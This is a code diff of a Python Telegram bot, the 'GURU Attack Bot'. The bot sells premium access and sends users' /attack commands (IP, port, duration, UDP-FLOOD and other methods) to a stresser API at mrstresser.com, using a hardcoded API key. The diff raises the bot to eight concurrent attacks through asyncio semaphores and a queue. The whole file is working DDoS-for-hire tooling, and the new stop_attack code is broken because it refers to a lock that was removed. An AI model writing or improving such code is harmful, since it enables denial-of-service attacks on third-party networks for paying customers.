@@ -1,4 +1,4 @@
-# app.py - COMPLETE FIXED WITH PROPER CONCURRENT
+# app.py - FULL CONCURRENT FIXED VERSION (8 Concurrent)
 import os
 import logging
 import asyncio
@@ -9,7 +9,6 @@ import random
 import string
 import json
 from datetime import datetime, timedelta
-from flask import Flask, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application, 
@@ -22,6 +21,7 @@ from telegram.ext import (
 import pymongo
 from pymongo import MongoClient
 from dotenv import load_dotenv
+from quart import Quart, jsonify  # Using Quart instead of Flask for async
 
 load_dotenv()
 
@@ -34,10 +34,9 @@ OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 PORT = int(os.getenv("PORT", 8080))
 
-# CONCURRENT SETTINGS - FIXED
-CONCURRENT_PER_ATTACK = 4  # Each attack uses 4 concurrent slots
-MAX_CONCURRENT_PER_USER = 8  # Each user can have up to 8 concurrent (2 attacks × 4)
-MAX_TOTAL_CONCURRENT = 8  # Total 8 concurrent
+# CONCURRENT SETTINGS - FULL POWER 8 CONCURRENT
+MAX_CONCURRENT_PER_USER = 8  # Each user can run 8 concurrent
+MAX_TOTAL_CONCURRENT = 8     # Total 8 concurrent (full power)
 MIN_DURATION = 60
 MAX_DURATION = 300
 
@@ -71,15 +70,26 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-flask_app = Flask(__name__)
+app = Quart(__name__)
 
-@flask_app.route('/')
-def index():
+@app.route('/')
+async def index():
     return "🤖 GURU Attack Bot is Running!"
 
-@flask_app.route('/health')
-def health():
+@app.route('/health')
+async def health():
     return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})
+
+@app.route('/concurrent')
+async def concurrent_status():
+    stats = attack_manager.get_stats()
+    return jsonify({
+        "active": stats['active'],
+        "concurrent_busy": stats['concurrent_busy'],
+        "max_total": stats['max_total'],
+        "queue_size": stats['queue_size'],
+        "user_attacks": stats['user_attacks']
+    })
 
 # ===== DATABASE =====
 class Database:
@@ -609,7 +619,7 @@ class Database:
             self.settings["pause_all"] = paused
             return False
     
-    def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=4):
+    def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=8):
         try:
             log = {
                 "user_id": user_id,
@@ -692,125 +702,166 @@ def init_pseudo_owner():
 init_owner()
 init_pseudo_owner()
 
-# ===== ATTACK MANAGER - FIXED CONCURRENT =====
+# ===== ATTACK MANAGER - FIXED FOR 8 CONCURRENT =====
 class AttackManager:
     def __init__(self):
         self.active_attacks = {}
         self.attack_counter = 0
-        self.lock = threading.Lock()
         self.total_attacks = 0
         self.concurrent_busy = 0
         self.user_active_attacks = {}
         self.attack_queue = []
         self.processing_queue = False
         self.background_tasks = set()
+        self.semaphore = asyncio.Semaphore(MAX_TOTAL_CONCURRENT)  # Control total concurrent
+        self.user_semaphores = {}  # Per user semaphores
+        
+        logger.info(f"⚡ Attack Manager initialized with {MAX_TOTAL_CONCURRENT} concurrent capacity")
+    
+    def get_user_semaphore(self, user_id):
+        """Get or create a semaphore for a user"""
+        if user_id not in self.user_semaphores:
+            max_per_user = MAX_TOTAL_CONCURRENT if db.is_owner_or_pseudo(user_id) else MAX_CONCURRENT_PER_USER
+            self.user_semaphores[user_id] = asyncio.Semaphore(max_per_user)
+        return self.user_semaphores[user_id]
     
     def get_max_concurrent_for_user(self, user_id):
         if db.is_owner_or_pseudo(user_id):
-            return MAX_TOTAL_CONCURRENT  # Owners get full 8
-        return MAX_CONCURRENT_PER_USER  # Regular users get 8 (2 attacks × 4 concurrent)
+            return MAX_TOTAL_CONCURRENT
+        return MAX_CONCURRENT_PER_USER
     
-    def can_start_attack(self, user_id):
-        with self.lock:
-            # Check total concurrent limit
-            if self.concurrent_busy + CONCURRENT_PER_ATTACK > MAX_TOTAL_CONCURRENT:
-                return False, f"❌ Not enough concurrent slots available.\nNeed {CONCURRENT_PER_ATTACK} slots, only {MAX_TOTAL_CONCURRENT - self.concurrent_busy} available."
-            
-            max_per_user = self.get_max_concurrent_for_user(user_id)
-            user_attacks = self.user_active_attacks.get(user_id, 0)
-            
-            # Each attack uses CONCURRENT_PER_ATTACK slots
-            if user_attacks + CONCURRENT_PER_ATTACK > max_per_user:
-                if db.is_owner_or_pseudo(user_id):
-                    return False, f"❌ You have reached maximum concurrent ({user_attacks}/{MAX_TOTAL_CONCURRENT})"
-                else:
-                    return False, f"❌ You have reached your limit ({user_attacks}/{MAX_CONCURRENT_PER_USER})"
-            
-            return True, "OK"
+    async def can_start_attack(self, user_id):
+        """Check if attack can start - async version"""
+        # Check total concurrent
+        if self.concurrent_busy >= MAX_TOTAL_CONCURRENT:
+            return False, f"❌ All {MAX_TOTAL_CONCURRENT} concurrent slots are full"
+        
+        # Check user limit
+        max_per_user = self.get_max_concurrent_for_user(user_id)
+        user_attacks = self.user_active_attacks.get(user_id, 0)
+        
+        if user_attacks >= max_per_user:
+            return False, f"❌ You have reached your limit ({user_attacks}/{max_per_user})"
+        
+        return True, "OK"
     
-    def start_attack(self, user_id, target, port, duration, method):
-        with self.lock:
-            self.attack_counter += 1
-            attack_id = self.attack_counter
-            self.total_attacks += 1
-            
-            # Each attack uses CONCURRENT_PER_ATTACK slots
-            self.concurrent_busy += CONCURRENT_PER_ATTACK
-            self.user_active_attacks[user_id] = self.user_active_attacks.get(user_id, 0) + CONCURRENT_PER_ATTACK
-            
-            self.active_attacks[attack_id] = {
-                'id': attack_id,
-                'user_id': user_id,
-                'target': target,
-                'port': port,
-                'duration': duration,
-                'method': method,
-                'start_time': datetime.now(),
-                'status': 'running',
-                'end_time': datetime.now() + timedelta(seconds=duration),
-                'concurrent_used': CONCURRENT_PER_ATTACK
-            }
-            
-            # Schedule cleanup after duration
-            asyncio.create_task(self.auto_cleanup(attack_id, duration))
-            
-            return attack_id
+    async def start_attack(self, user_id, target, port, duration, method, context):
+        """Start a new attack with semaphore control"""
+        # Check if can start
+        can_start, msg = await self.can_start_attack(user_id)
+        if not can_start:
+            return None, msg
+        
+        # Acquire semaphore for total concurrent
+        await self.semaphore.acquire()
+        
+        # Acquire user semaphore
+        user_sem = self.get_user_semaphore(user_id)
+        await user_sem.acquire()
+        
+        # Create attack
+        self.attack_counter += 1
+        attack_id = self.attack_counter
+        self.concurrent_busy += 1
+        self.total_attacks += 1
+        self.user_active_attacks[user_id] = self.user_active_attacks.get(user_id, 0) + 1
+        
+        self.active_attacks[attack_id] = {
+            'id': attack_id,
+            'user_id': user_id,
+            'target': target,
+            'port': port,
+            'duration': duration,
+            'method': method,
+            'start_time': datetime.now(),
+            'status': 'running',
+            'end_time': datetime.now() + timedelta(seconds=duration)
+        }
+        
+        logger.info(f"🔥 Attack {attack_id} started - User: {user_id} - Target: {target}:{port} - Total: {self.concurrent_busy}/{MAX_TOTAL_CONCURRENT}")
+        
+        # Execute attack in background
+        asyncio.create_task(self.execute_attack_with_cleanup(
+            attack_id, target, port, duration, user_id, context, method
+        ))
+        
+        return attack_id, "Attack started"
     
-    async def auto_cleanup(self, attack_id, duration):
-        await asyncio.sleep(duration + 5)
-        self.force_stop_attack(attack_id)
-    
-    def force_stop_attack(self, attack_id):
-        with self.lock:
-            if attack_id in self.active_attacks:
-                user_id = self.active_attacks[attack_id]['user_id']
-                concurrent_used = self.active_attacks[attack_id].get('concurrent_used', CONCURRENT_PER_ATTACK)
-                self.active_attacks[attack_id]['status'] = 'stopped'
-                self.concurrent_busy = max(0, self.concurrent_busy - concurrent_used)
+    async def execute_attack_with_cleanup(self, attack_id, target, port, duration, user_id, context, method):
+        """Execute attack and clean up resources"""
+        try:
+            # Send API request
+            result = await send_api_attack_background(target, port, duration, user_id, context, method)
+            
+            if result and result.get('success'):
+                attack_info = db.log_attack(
+                    user_id, target, port, duration, method,
+                    "success", str(result), concurrent_count=1
+                )
+                await send_attack_alert(attack_info)
+            else:
+                db.log_attack(
+                    user_id, target, port, duration, method,
+                    "failed", str(result), concurrent_count=1
+                )
                 
-                if user_id in self.user_active_attacks:
-                    self.user_active_attacks[user_id] = max(0, self.user_active_attacks[user_id] - concurrent_used)
-                    if self.user_active_attacks[user_id] == 0:
-                        del self.user_active_attacks[user_id]
-                
-                del self.active_attacks[attack_id]
-                return True
-            return False
+        except Exception as e:
+            logger.error(f"Attack {attack_id} execution failed: {e}")
+            
+        finally:
+            # Clean up resources
+            self.stop_attack(attack_id)
     
     def stop_attack(self, attack_id):
-        with self.lock:
+        """Stop an attack and release resources"""
+        with self.lock if hasattr(self, 'lock') else None:
             if attack_id in self.active_attacks:
-                user_id = self.active_attacks[attack_id]['user_id']
-                concurrent_used = self.active_attacks[attack_id].get('concurrent_used', CONCURRENT_PER_ATTACK)
-                self.active_attacks[attack_id]['status'] = 'stopped'
-                self.concurrent_busy = max(0, self.concurrent_busy - concurrent_used)
+                attack = self.active_attacks[attack_id]
+                user_id = attack['user_id']
+                
+                # Remove from active
+                del self.active_attacks[attack_id]
+                
+                # Update counters
+                self.concurrent_busy = max(0, self.concurrent_busy - 1)
                 
                 if user_id in self.user_active_attacks:
-                    self.user_active_attacks[user_id] = max(0, self.user_active_attacks[user_id] - concurrent_used)
+                    self.user_active_attacks[user_id] = max(0, self.user_active_attacks[user_id] - 1)
                     if self.user_active_attacks[user_id] == 0:
                         del self.user_active_attacks[user_id]
                 
-                del self.active_attacks[attack_id]
+                # Release semaphores
+                self.semaphore.release()
+                if user_id in self.user_semaphores:
+                    self.user_semaphores[user_id].release()
+                
+                logger.info(f"✅ Attack {attack_id} completed - Active: {self.concurrent_busy}/{MAX_TOTAL_CONCURRENT}")
                 return True
             return False
     
+    def force_stop_all(self):
+        """Emergency stop all attacks"""
+        attack_ids = list(self.active_attacks.keys())
+        for attack_id in attack_ids:
+            self.stop_attack(attack_id)
+        logger.warning(f"🛑 Emergency stop: {len(attack_ids)} attacks stopped")
+    
     def get_stats(self):
-        with self.lock:
-            active = len([a for a in self.active_attacks.values() if a['status'] == 'running'])
-            
-            return {
-                'active': active,
-                'concurrent_busy': self.concurrent_busy,
-                'total': self.total_attacks,
-                'max_total': MAX_TOTAL_CONCURRENT,
-                'max_per_user': MAX_CONCURRENT_PER_USER,
-                'concurrent_per_attack': CONCURRENT_PER_ATTACK,
-                'user_attacks': dict(self.user_active_attacks),
-                'queue_size': len(self.attack_queue),
-                'active_attacks': self.active_attacks
-            }
+        """Get current stats"""
+        active = len([a for a in self.active_attacks.values() if a.get('status') == 'running'])
+        
+        return {
+            'active': active,
+            'concurrent_busy': self.concurrent_busy,
+            'total': self.total_attacks,
+            'max_total': MAX_TOTAL_CONCURRENT,
+            'max_per_user': MAX_CONCURRENT_PER_USER,
+            'user_attacks': dict(self.user_active_attacks),
+            'queue_size': len(self.attack_queue)
+        }
     
     def add_to_queue(self, user_id, target, port, duration, method, context):
+        """Add attack to queue if concurrent slots are full"""
         self.attack_queue.append({
             'user_id': user_id,
             'target': target,
@@ -825,84 +876,44 @@ class AttackManager:
             asyncio.create_task(self.process_queue())
     
     async def process_queue(self):
+        """Process queued attacks"""
         self.processing_queue = True
         while self.attack_queue:
             attack_data = self.attack_queue.pop(0)
             user_id = attack_data['user_id']
             
-            can_start, msg = self.can_start_attack(user_id)
-            if not can_start:
-                try:
-                    await attack_data['context'].bot.send_message(
-                        chat_id=user_id,
-                        text=f"⏳ *Queue Update*\n\n{msg}",
-                        parse_mode='Markdown'
-                    )
-                except:
-                    pass
-                self.attack_queue.append(attack_data)
-                await asyncio.sleep(2)
-                continue
-            
             try:
-                attack_id = self.start_attack(
-                    user_id, 
-                    attack_data['target'], 
-                    attack_data['port'], 
-                    attack_data['duration'], 
-                    attack_data['method']
-                )
-                
-                # Send actual API request in background
-                task = asyncio.create_task(self.execute_attack(
-                    attack_id,
+                # Try to start attack
+                attack_id, msg = await self.start_attack(
+                    user_id,
                     attack_data['target'],
                     attack_data['port'],
                     attack_data['duration'],
-                    user_id,
-                    attack_data['context'],
-                    attack_data['method']
-                ))
-                self.background_tasks.add(task)
-                task.add_done_callback(self.background_tasks.discard)
-                
-                await attack_data['context'].bot.send_message(
-                    chat_id=user_id,
-                    text=f"✅ *ATTACK SENT!*\n\n"
-                         f"🎯 Target: `{attack_data['target']}:{attack_data['port']}`\n"
-                         f"⏱️ Duration: `{attack_data['duration']}s`\n"
-                         f"📡 Method: `{attack_data['method']}`\n"
-                         f"🔄 Concurrent: `{self.concurrent_busy}/{MAX_TOTAL_CONCURRENT}`\n"
-                         f"⚡ This attack uses {CONCURRENT_PER_ATTACK} concurrent slots\n"
-                         f"📊 Status: Attack running in background",
-                    parse_mode='Markdown'
+                    attack_data['method'],
+                    attack_data['context']
                 )
                 
+                if attack_id:
+                    await attack_data['context'].bot.send_message(
+                        chat_id=user_id,
+                        text=f"✅ *QUEUE ATTACK STARTED!*\n\n"
+                             f"🎯 Target: `{attack_data['target']}:{attack_data['port']}`\n"
+                             f"⏱️ Duration: `{attack_data['duration']}s`\n"
+                             f"📡 Method: `{attack_data['method']}`\n"
+                             f"🔄 Concurrent: `{self.concurrent_busy}/{MAX_TOTAL_CONCURRENT}`",
+                        parse_mode='Markdown'
+                    )
+                else:
+                    # Re-queue if still can't start
+                    self.attack_queue.append(attack_data)
+                    await asyncio.sleep(1)
+                    
             except Exception as e:
-                logger.error(f"Queue attack failed: {e}")
+                logger.error(f"Queue processing error: {e}")
+                self.attack_queue.append(attack_data)
+                await asyncio.sleep(2)
         
         self.processing_queue = False
-    
-    async def execute_attack(self, attack_id, target, port, duration, user_id, context, method):
-        try:
-            # Send the actual API request (non-blocking)
-            result = await send_api_attack_background(target, port, duration, user_id, context, method)
-            
-            if result and result.get('success'):
-                attack_info = db.log_attack(
-                    user_id, target, port, duration, method,
-                    "success", str(result),
-                    CONCURRENT_PER_ATTACK
-                )
-                await send_attack_alert(attack_info)
-            
-            self.stop_attack(attack_id)
-            
-        except Exception as e:
-            logger.error(f"Attack execution failed: {e}")
-            self.stop_attack(attack_id)
-
-attack_manager = AttackManager()
 
 # ===== SEND ALERT TO ADMINS =====
 async def send_attack_alert(attack_info):
@@ -937,9 +948,9 @@ async def send_attack_alert(attack_info):
     except Exception as e:
         logger.error(f"Alert error: {e}")
 
-# ===== API ATTACK - BACKGROUND =====
+# ===== API ATTACK - NON-BLOCKING WITH CONCURRENT SUPPORT =====
 async def send_api_attack_background(target, port, duration, user_id, context, method="UDP-FLOOD"):
-    """Send attack to API - NON-BLOCKING"""
+    """Send attack to API - Supports 8 concurrent attacks"""
     api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
     api_url = os.getenv("API_URL", "https://mrstresser.com/api")
     
@@ -963,9 +974,12 @@ async def send_api_attack_background(target, port, duration, user_id, context, m
         "Connection": "keep-alive"
     }
     
+    # Create a new session for each request for better concurrency
+    connector = aiohttp.TCPConnector(limit=50, limit_per_host=20)
+    timeout = aiohttp.ClientTimeout(total=10, connect=5)
+    
     try:
-        timeout = aiohttp.ClientTimeout(total=10, connect=5)
-        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
             start_time = time.time()
             
             async with session.get(api_url, params=params) as response:
@@ -976,7 +990,7 @@ async def send_api_attack_background(target, port, duration, user_id, context, m
                 except:
                     response_text = "Unable to read response"
                 
-                logger.info(f"API Response: {response.status} in {elapsed:.2f}s")
+                logger.info(f"API Response: {response.status} in {elapsed:.2f}s - Concurrent: {attack_manager.concurrent_busy}/{MAX_TOTAL_CONCURRENT}")
                 
                 if response.status == 200:
                     return {
@@ -1019,8 +1033,10 @@ async def check_api_status():
             "Connection": "keep-alive"
         }
         
+        connector = aiohttp.TCPConnector(limit=10)
         timeout = aiohttp.ClientTimeout(total=35, connect=10)
-        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
+        
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
             start_time = time.time()
             async with session.get(api_url, params=params) as response:
                 elapsed = time.time() - start_time
@@ -1082,15 +1098,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         concurrent_info = f"{MAX_TOTAL_CONCURRENT} (Full access - Owner)"
     else:
         max_concurrent = MAX_CONCURRENT_PER_USER
-        concurrent_info = f"{MAX_CONCURRENT_PER_USER} (2 attacks × {CONCURRENT_PER_ATTACK} concurrent)"
+        concurrent_info = f"{MAX_CONCURRENT_PER_USER} (Per user)"
     
     welcome_msg = (
-        f"👋 *WELCOME TO GURU*\n\n"
+        f"👋 *WELCOME TO GURU - FULL POWER*\n\n"
         f"Hello {first_name}! 👋\n"
         f"📊 Total Attacks: {total_attacks}\n"
         f"📊 Plan: {plan_display}\n"
         f"⚡ Max Concurrent: {MAX_TOTAL_CONCURRENT} total\n"
-        f"⚡ Per Attack: {CONCURRENT_PER_ATTACK} concurrent\n"
         f"👤 Your Concurrent: {concurrent_info}\n"
         f"📊 Active Attacks: {user_attacks}/{max_concurrent}\n"
         f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}\n\n"
@@ -1150,10 +1165,9 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"❌ *Usage:* `/attack IP PORT TIME [METHOD]`\n\n"
             f"Example: `/attack 91.108.17.41 32001 60 UDP-FLOOD`\n"
             f"Default method: UDP-FLOOD\n\n"
-            f"⚡ Each attack uses {CONCURRENT_PER_ATTACK} concurrent\n"
             f"⚡ Total Concurrent: {MAX_TOTAL_CONCURRENT}\n"
-            f"👤 Users: {MAX_CONCURRENT_PER_USER} concurrent max (2 attacks)\n"
-            f"👑 Owners: {MAX_TOTAL_CONCURRENT} concurrent\n"
+            f"👤 Users: {MAX_CONCURRENT_PER_USER}x concurrent each\n"
+            f"👑 Owners: {MAX_TOTAL_CONCURRENT}x concurrent\n"
             f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds",
             parse_mode='Markdown'
         )
@@ -1172,9 +1186,13 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
             return
         
-        can_start, msg = attack_manager.can_start_attack(user_id)
-        if not can_start:
-            if "Not enough concurrent slots" in msg or "reached your limit" in msg:
+        # Try to start attack with semaphore
+        attack_id, msg = await attack_manager.start_attack(
+            user_id, target, port, duration, method, context
+        )
+        
+        if not attack_id:
+            if "limit" in msg or "full" in msg:
                 attack_manager.add_to_queue(user_id, target, port, duration, method, context)
                 await update.message.reply_text(
                     f"⏳ *Added to Queue*\n\n{msg}\n\n💡 Your attack will start when resources are available.",
@@ -1185,26 +1203,17 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text(msg, parse_mode='Markdown')
                 return
         
-        # Start attack immediately
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
-        
-        # Send API request in background
-        task = asyncio.create_task(attack_manager.execute_attack(
-            attack_id, target, port, duration, user_id, context, method
-        ))
-        attack_manager.background_tasks.add(task)
-        task.add_done_callback(attack_manager.background_tasks.discard)
+        stats = attack_manager.get_stats()
         
         # Send immediate confirmation
         await update.message.reply_text(
-            f"✅ *ATTACK SENT!*\n\n"
+            f"✅ *ATTACK STARTED!*\n\n"
             f"🎯 Target: `{target}:{port}`\n"
             f"⏱️ Duration: `{duration}s`\n"
             f"📡 Method: `{method}`\n"
-            f"🔄 Concurrent: `{attack_manager.concurrent_busy}/{MAX_TOTAL_CONCURRENT}`\n"
-            f"⚡ This attack uses {CONCURRENT_PER_ATTACK} concurrent slots\n"
-            f"📊 Status: Attack running in background\n\n"
-            f"💡 You can start another attack immediately!",
+            f"🔄 Concurrent: `{stats['concurrent_busy']}/{MAX_TOTAL_CONCURRENT}`\n"
+            f"📊 Status: Attack running\n\n"
+            f"💡 You can start up to {MAX_CONCURRENT_PER_USER} attacks simultaneously!",
             parse_mode='Markdown'
         )
         
@@ -1235,11 +1244,6 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("❌ You are banned!")
         return
     
-    can_start, msg = attack_manager.can_start_attack(user_id)
-    if not can_start:
-        await query.edit_message_text(msg, parse_mode='Markdown')
-        return
-    
     keyboard = []
     for method in ATTACK_METHODS:
         keyboard.append([InlineKeyboardButton(f"📡 {method}", callback_data=f"method_{method}")])
@@ -1251,10 +1255,10 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await query.edit_message_text(
         f"💥 *SELECT ATTACK METHOD*\n\n"
-        f"⚡ Each attack uses {CONCURRENT_PER_ATTACK} concurrent slots\n"
-        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
-        f"⚡ Total: {stats['concurrent_busy']}/{MAX_TOTAL_CONCURRENT}\n"
-        f"👤 Your Active: {user_attacks}/{max_concurrent}\n\n"
+        f"⚡ FULL POWER: {MAX_TOTAL_CONCURRENT}x concurrent\n"
+        f"👤 Your Limit: {max_concurrent}x concurrent\n"
+        f"📊 Currently: {stats['concurrent_busy']}/{MAX_TOTAL_CONCURRENT} active\n"
+        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n\n"
         f"After selecting, send: `IP PORT TIME`\n"
         f"Example: `91.108.17.41 32001 60`",
         reply_markup=InlineKeyboardMarkup(keyboard),
@@ -1273,8 +1277,8 @@ async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📡 *Method Selected: {method}*\n\n"
         f"Send: `IP PORT TIME`\n"
         f"Example: `91.108.17.41 32001 60`\n\n"
-        f"⚡ Each attack uses {CONCURRENT_PER_ATTACK} concurrent slots\n"
         f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
+        f"⚡ Max {MAX_CONCURRENT_PER_USER}x concurrent attacks\n"
         f"Send /cancel to cancel",
         parse_mode='Markdown'
     )
@@ -1328,41 +1332,34 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
             return
         
-        can_start, msg = attack_manager.can_start_attack(user_id)
-        if not can_start:
-            if "Not enough concurrent slots" in msg or "reached your limit" in msg:
+        # Try to start attack with semaphore
+        attack_id, msg = await attack_manager.start_attack(
+            user_id, target, port, duration, method, context
+        )
+        
+        if not attack_id:
+            if "limit" in msg or "full" in msg:
                 attack_manager.add_to_queue(user_id, target, port, duration, method, context)
                 await update.message.reply_text(
                     f"⏳ *Added to Queue*\n\n{msg}\n\n💡 Your attack will start when resources are available.",
                     parse_mode='Markdown'
                 )
-                context.user_data['awaiting_attack'] = False
                 return
             else:
                 await update.message.reply_text(msg, parse_mode='Markdown')
-                context.user_data['awaiting_attack'] = False
                 return
         
-        # Start attack immediately
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
-        
-        # Send API request in background
-        task = asyncio.create_task(attack_manager.execute_attack(
-            attack_id, target, port, duration, user_id, context, method
-        ))
-        attack_manager.background_tasks.add(task)
-        task.add_done_callback(attack_manager.background_tasks.discard)
+        stats = attack_manager.get_stats()
         
         # Send immediate confirmation
         await update.message.reply_text(
-            f"✅ *ATTACK SENT!*\n\n"
+            f"✅ *ATTACK STARTED!*\n\n"
             f"🎯 Target: `{target}:{port}`\n"
             f"⏱️ Duration: `{duration}s`\n"
             f"📡 Method: `{method}`\n"
-            f"🔄 Concurrent: `{attack_manager.concurrent_busy}/{MAX_TOTAL_CONCURRENT}`\n"
-            f"⚡ This attack uses {CONCURRENT_PER_ATTACK} concurrent slots\n"
-            f"📊 Status: Attack running in background\n\n"
-            f"💡 You can start another attack immediately!",
+            f"🔄 Concurrent: `{stats['concurrent_busy']}/{MAX_TOTAL_CONCURRENT}`\n"
+            f"📊 Status: Attack running\n\n"
+            f"💡 You can start up to {MAX_CONCURRENT_PER_USER} attacks simultaneously!",
             parse_mode='Markdown'
         )
         
@@ -1389,10 +1386,9 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         if is_owner:
             text = (
-                "👑 *OWNER ACCESS*\n\n"
+                "👑 *OWNER ACCESS - FULL POWER*\n\n"
                 "📊 Plan: 💎 PREMIUM (Owner)\n"
                 f"⚡ {MAX_TOTAL_CONCURRENT}x Concurrent (Full Access)\n"
-                f"⚡ {CONCURRENT_PER_ATTACK} concurrent per attack\n"
                 f"📡 {len(ATTACK_METHODS)} Attack Methods\n"
                 "⏱️ Unlimited Attacks"
             )
@@ -1404,9 +1400,8 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"⏱️ Remaining: {days_left} days\n"
                 f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M')}\n\n"
                 "📌 Features:\n"
-                f"• {CONCURRENT_PER_ATTACK} concurrent per attack\n"
-                f"• {MAX_CONCURRENT_PER_USER} total concurrent (2 attacks)\n"
-                f"• {MAX_TOTAL_CONCURRENT} total system concurrent\n"
+                f"• {MAX_CONCURRENT_PER_USER}x Concurrent attacks\n"
+                f"• {MAX_TOTAL_CONCURRENT} total concurrent\n"
                 f"• {len(ATTACK_METHODS)} attack methods"
             )
         else:
@@ -1415,9 +1410,8 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "📊 Plan: 💎 PREMIUM\n"
                 "⏱️ Status: LIFETIME\n\n"
                 "📌 Features:\n"
-                f"• {CONCURRENT_PER_ATTACK} concurrent per attack\n"
-                f"• {MAX_CONCURRENT_PER_USER} total concurrent (2 attacks)\n"
-                f"• {MAX_TOTAL_CONCURRENT} total system concurrent\n"
+                f"• {MAX_CONCURRENT_PER_USER}x Concurrent attacks\n"
+                f"• {MAX_TOTAL_CONCURRENT} total concurrent\n"
                 f"• {len(ATTACK_METHODS)} attack methods"
             )
     
@@ -1445,14 +1439,13 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     banned_users = len(db.get_banned_users())
     
     await query.edit_message_text(
-        f"📊 *BOT STATISTICS*\n\n"
+        f"📊 *BOT STATISTICS - FULL POWER*\n\n"
         f"👥 Users: {len(users)}\n"
         f"💎 Premium: {premium_users}\n"
         f"🚫 Banned: {banned_users}\n"
         f"👑 Admins: {len(admins)}\n"
         f"💥 Attacks: {total_attacks}\n"
         f"⚡ Active: {stats['concurrent_busy']}/{stats['max_total']}\n"
-        f"⚡ Per Attack: {stats['concurrent_per_attack']} concurrent\n"
         f"⏳ Queue: {stats['queue_size']}\n"
         f"📡 Methods: {len(ATTACK_METHODS)}",
         parse_mode='Markdown',
@@ -1670,6 +1663,7 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     pause_info = db.get_pause_info()
     pause_status = pause_info.get('paused', False)
     pause_text = "⏸️ PAUSE BOT" if not pause_status else "▶️ RESUME BOT"
+    stats = attack_manager.get_stats()
     
     keyboard = [
         [InlineKeyboardButton("👑 PROMOTE ADMIN", callback_data="owner_promote")],
@@ -1684,7 +1678,10 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     
     await query.edit_message_text(
-        f"👑 OWNER PANEL\n\nStatus: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}\n⚡ Full {MAX_TOTAL_CONCURRENT}x Concurrent Access\n⚡ {CONCURRENT_PER_ATTACK} concurrent per attack",
+        f"👑 OWNER PANEL - FULL POWER\n\n"
+        f"Status: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}\n"
+        f"⚡ Concurrent: {stats['concurrent_busy']}/{MAX_TOTAL_CONCURRENT}\n"
+        f"⏳ Queue: {stats['queue_size']}",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
@@ -1942,7 +1939,7 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         duration_text = "LIFETIME" if result['access_days'] >= 3650 else f"{result['access_days']} days"
         
         await update.message.reply_text(
-            f"✅ *CODE REDEEMED!*\n\nCode: `{code}`\nDuration: {duration_text}\n📊 Plan: PREMIUM\n\n🎉 You now have premium access!",
+            f"✅ *CODE REDEEMED!*\n\nCode: `{code}`\nDuration: {duration_text}\n📊 Plan: PREMIUM\n\n🎉 You now have premium access with {MAX_CONCURRENT_PER_USER}x concurrent attacks!",
             parse_mode='Markdown'
         )
     else:
@@ -1953,9 +1950,8 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     users = db.get_all_users()
     
     await update.message.reply_text(
-        f"📊 *BOT STATUS*\n\n"
+        f"📊 *BOT STATUS - FULL POWER*\n\n"
         f"⚡ Active: {stats['concurrent_busy']}/{stats['max_total']}\n"
-        f"⚡ Per Attack: {stats['concurrent_per_attack']} concurrent\n"
         f"👥 Users: {len(users)}\n"
         f"⏳ Queue: {stats['queue_size']}\n"
         f"📡 Methods: {len(ATTACK_METHODS)}\n"
@@ -2013,62 +2009,74 @@ def run_bot():
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
-    app = Application.builder().token(TELEGRAM_TOKEN).build()
-    application = app
+    app_bot = Application.builder().token(TELEGRAM_TOKEN).build()
+    application = app_bot
     
     # COMMANDS
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("attack", attack_command))
-    app.add_handler(CommandHandler("redeem", redeem_command))
-    app.add_handler(CommandHandler("status", status_command))
-    app.add_handler(CommandHandler("cancel", cancel))
+    app_bot.add_handler(CommandHandler("start", start))
+    app_bot.add_handler(CommandHandler("attack", attack_command))
+    app_bot.add_handler(CommandHandler("redeem", redeem_command))
